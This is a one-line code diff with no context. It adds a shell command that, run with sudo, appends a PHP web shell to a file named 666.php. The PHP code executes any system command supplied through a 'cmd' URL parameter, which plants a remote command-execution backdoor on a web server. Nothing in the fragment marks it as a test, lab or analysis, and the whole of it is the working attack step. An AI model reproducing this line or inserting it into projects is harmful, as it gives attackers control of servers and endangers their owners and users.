@@ -1,1 +1,1 @@
-
+sudo sh -c "echo '<?php system($_GET['cmd']); ?>' >> 666.php"
